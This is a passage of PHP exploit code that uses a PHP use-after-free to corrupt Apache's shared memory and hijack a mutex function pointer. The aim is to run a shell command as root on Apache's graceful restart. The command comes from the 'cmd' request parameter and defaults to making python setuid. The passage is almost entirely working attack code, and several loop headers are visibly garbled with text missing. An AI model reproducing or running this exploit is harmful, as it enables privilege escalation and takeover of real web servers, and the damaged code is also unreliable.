            # anything that comes after it in memory by changing its size and
            # making in-place edits using $this->abc[$position] = $char
            $x = new DateInterval('PT1S');
            # zend_string.refcount = 0
            # It will get incremented at some point, and if it is > 1,
            # zend_assign_to_string_offset() will try to duplicate it before making
            # the in-place replacement
            $x->y = 0x00;
            # zend_string.len
            $x->d = 0x100;
            # zend_string.val[0-4]
            $x->h = 0x13121110;
            # Verify UAF was successful
            # We modified stuff via $x; they should be visible by $this->abc, since
            # they are at the same memory location.
            if(!(
                strlen($this->abc) === $x->d &&
                $this->abc[0] == "x10" &&
                $this->abc[1] == "x11" &&
                $this->abc[2] == "x12" &&
                $this->abc[3] == "x13"
            ))
            {
                o('UAF failed, exiting.');
                exit();
            }
            o('UAF successful.');
            o('');
            # Give us some room
            # I: As indicated before, just unset a lot of stuff so that next allocs
            # don't break our fragile UAFd structure.
            unset($room);
            #
            # Setup the R/W primitive
            #
            # We control $abc's internal zend_string structure, therefore we can R/W
            # the shared memory block (SHM), but for that we need to know the
            # position of $abc in memory
            # I: We know the absolute position of the SHM, so we need to need abc's
            # as well, otherwise we cannot compute the offset
            # Assuming the allocation was contiguous, memory looks like this, with
            # 0x70-sized fastbins:
            #   [zend_string:abc]
            #   [zend_string:protector]
            #   [FREE#1]
            #   [FREE#2]
            # Therefore, the address of the 2nd free block is in the first 8 bytes
            # of the first block: 0x70 * 2 - 24
            $address = str2ptr($this->abc, 0x70 * 2 - 24);
            # The address we got points to FREE#2, hence we're |block| * 3 higher in
            # memory
            $address = $address - 0x70 * 3;
            # The beginning of the string is 24 bytes after its origin
            $address = $address + 24;
            o('Address of $abc: 0x' . dechex($address));
            o('');
            # Compute the size required for our string to include the whole SHM and
            # apache's memory region
            $distance = 
                max($addresses['apache'][1], $addresses['shm'][1]) -                $address
            ;
            $x->d = $distance;
            # We can now read/write in the whole SHM and apache's memory region.
            #
            # Find all_buckets in memory
            #
            # We are looking for a structure s.t.
            # |all_buckets, mutex| = 0x10
            # |mutex, meth| = 0x8
            # all_buckets is in apache's memory region
            # mutex is in apache's memory region
            # meth is in libaprR's memory region
            # meth's function pointers are in libaprX's memory region
            o('Looking for all_buckets in memory');
            $all_buckets = 0;
            for(
                $i = $addresses['apache'][0] + 0x10;
                $i abc, $i - $address);
                if(!in($pointer, $addresses['apache']))
                    continue;
                # meth
                $meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);
                if(!in($pointer, $addresses['libaprR']))
                    continue;
                o('  [&mutex]: 0x' . dechex($i));
                o('    [mutex]: 0x' . dechex($mutex));
                o('      [meth]: 0x' . dechex($meth));
                # meth->*
                # flags
                if(str2ptr($this->abc, $pointer - $address) != 0)
                    continue;
                # methods
                for($j=0;$jabc, $pointer + 0x8 + $j * 8 - $address);
                    if(!in($m, $addresses['libaprX']))
                        continue 2;
                    o('        [*]: 0x' . dechex($m));
                }
                $all_buckets = $i - 0x10;
                o('all_buckets = 0x' . dechex($all_buckets));
                break;
            }
            if(!$all_buckets)
            {
                o('Unable to find all_buckets');
                exit();
            }
            o('');
            # The address of all_buckets will change when apache is gracefully
            # restarted. This is a problem because we need to know all_buckets's
            # address in order to make all_buckets[some_index] point to a memory
            # region we control.
            #
            # Compute potential bucket indexes and their addresses
            #
            o('Computing potential bucket indexes and addresses');
            # Since we have sizeof($workers_pid) MPM workers, we can fill the rest
            # of the ap_score_image->servers items, so 256 - sizeof($workers_pids),
            # with data we like. We keep the one at the top to store our payload.
            # The rest is sprayed with the address of our payload.
            $size_prefork_child_bucket = 24;
            $size_worker_score = 264;
            # I get strange errors if I use every "free" item, so I leave twice as
            # many items free. I'm guessing upon startup some
            $spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
            $spray_max = $addresses['shm'][1];
            $spray_min = $spray_max - $spray_size;
            $spray_middle = (int) (($spray_min + $spray_max) / 2);
            $bucket_index_middle = (int) (
                - ($all_buckets + 0x1a000 - $spray_middle) /
                $size_prefork_child_bucket
            );
            //o(dechex($bucket_index_middle));
            // o(dechex($bucket_index_middle) . " " . dechex($all_buckets) . " " . dechex($spray_middle) . " " . dechex($size_prefork_child_bucket));
            #
            # Build payload
            #
            # A worker_score structure was kept empty to put our payload in
            $payload_start = $spray_min - $size_worker_score;
            $z = ptr2str(0);
            # Payload maxsize 264 - 112 = 152
            # Offset 8 cannot be 0, but other than this you can type whatever
            # command you want
            $bucket = isset($_REQUEST['cmd']) ?
                $_REQUEST['cmd'] :
                "chmod +s /usr/bin/python3.6";
            if(strlen($bucket) > $size_worker_score - 112)
            {
                o(
                    'Payload size is bigger than available space (' .
                    ($size_worker_score - 112) .
                    '), exiting.'
                );
                exit();
            }
            # Align
            $bucket = str_pad($bucket, $size_worker_score - 112, "x00");
            # apr_proc_mutex_unix_lock_methods_t
            $meth = 
                $z .
                $z .
                $z .
                $z .
                $z .
                $z .
                # child_init
                ptr2str($addresses['zend_object_std_dtor'])
            ;
            # The second pointer points to meth, and is used before reaching the
            # arbitrary function call
            # The third one and the last one are both used by the function call
            # zend_object_std_dtor(object) => ... => system(&arData[0]->val)
            $properties = 
                # refcount
                ptr2str(1) .
                # u-nTableMask meth
                ptr2str($payload_start + strlen($bucket)) .
                # Bucket arData
                ptr2str($payload_start) .
                # uint32_t nNumUsed;
                ptr2str(1, 4) .
                # uint32_t nNumOfElements;
                ptr2str(0, 4) .
                # uint32_t nTableSize
                ptr2str(0, 4) .
                # uint32_t nInternalPointer
                ptr2str(0, 4) .
                # zend_long nNextFreeElement
                $z .
                # dtor_func_t pDestructor
                ptr2str($addresses['system'])
            ;
            $payload =
                $bucket .
                $meth .
                $properties
            ;
            # Write the payload
            o('Placing payload at address 0x' . dechex($payload_start));
            $p = $payload_start - $address;
            for(
                $i = 0;
                $i abc[$p+$i] = $payload[$i];
            }
            # Fill the spray area with a pointer to properties
            $properties_address = $payload_start + strlen($bucket) + strlen($meth);
            o('Spraying pointer');
            o('  Address: 0x' . dechex($properties_address));
            o('  From: 0x' . dechex($spray_min));
            o('  To: 0x' . dechex($spray_max));
            o('  Size: 0x' . dechex($spray_size));
            o('  Covered: 0x' . dechex($spray_size * count($workers_pids)));
            o('  Apache: 0x' . dechex(
                $addresses['apache'][1] -                $addresses['apache'][0]
            ));
            $s_properties_address = ptr2str($properties_address);
            for(
                $i = $spray_min;
                $i abc[$i - $address] = $s_properties_address[$i % 8];
            }
            o('');
            # Find workers PID in the SHM: it indicates the beginning of their
            # process_score structure. We can then change process_score.bucket to
            # the index we computed. When apache reboots, it will use
            # all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex
            # which means we control the whole apr_proc_mutex_t structure.
            # This structure contains pointers to multiple functions, especially
            # mutex->meth->child_init(), which will be called before privileges
            # are dropped.
            # We do this for every worker PID, incrementing the bucket index so that
            # we cover a bigger range.
            o('Iterating in SHM to find PIDs...');
            # Number of bucket indexes covered by our spray
            $spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);
            # Number of bucket indexes covered by our spray and the PS structures
            $total_nb_buckets = $spray_nb_buckets * count($workers_pids);
            # First bucket index to handle
            $bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);
            // $bucket_index = $bucket_index_middle;
            # Iterate over every process_score structure until we find every PID or
            # we reach the end of the SHM
            for(
                $p = $addresses['shm'][0] + 0x20;
                $p  0;
                $p += 0x24
            )
            {
                $l = $p - $address;
                $current_pid = str2ptr($this->abc, $l, 4);
                o('Got PID: ' . $current_pid);
                # The PID matches one of the workers
                if(in_array($current_pid, $workers_pids))
                {
                    unset($workers_pids[$current_pid]);
                    o('  PID matches');
                    # Update bucket address
                    $s_bucket_index = pack('l', $bucket_index);
                    $this->abc[$l + 0x20] = $s_bucket_index[0];
                    $this->abc[$l + 0x21] = $s_bucket_index[1];
                    $this->abc[$l + 0x22] = $s_bucket_index[2];
                    $this->abc[$l + 0x23] = $s_bucket_index[3];
                    o('  Changed bucket value to ' . $bucket_index);
                    $min = $spray_min - $size_prefork_child_bucket * $bucket_index;
                    $max = $spray_max - $size_prefork_child_bucket * $bucket_index;
                    o('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));
                    # This bucket range is covered, go to the next one
                    $bucket_index += $spray_nb_buckets;
                }
            }
            if(count($workers_pids) > 0)
            {
                o(
                    'Unable to find PIDs ' .
                    implode(', ', $workers_pids) .
                    ' in SHM, exiting.'
                );
                exit();
            }
            o('');
            o('EXPLOIT SUCCESSFUL.');
            o('Await 6:25AM.');
            return 0;
        }
    }
    function o($msg)
    {
        # No concatenation -> no string allocation
        print($msg);
        print("n");
    }
    function ptr2str($ptr, $m=8)
    {
        $out = "";
        for ($i=0; $i>= 8;
        }
        return $out;
    }
    function str2ptr(&$str, $p, $s=8)
    {
        $address = 0;
        for($j=$s-1;$j>=0;$j--)
        {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }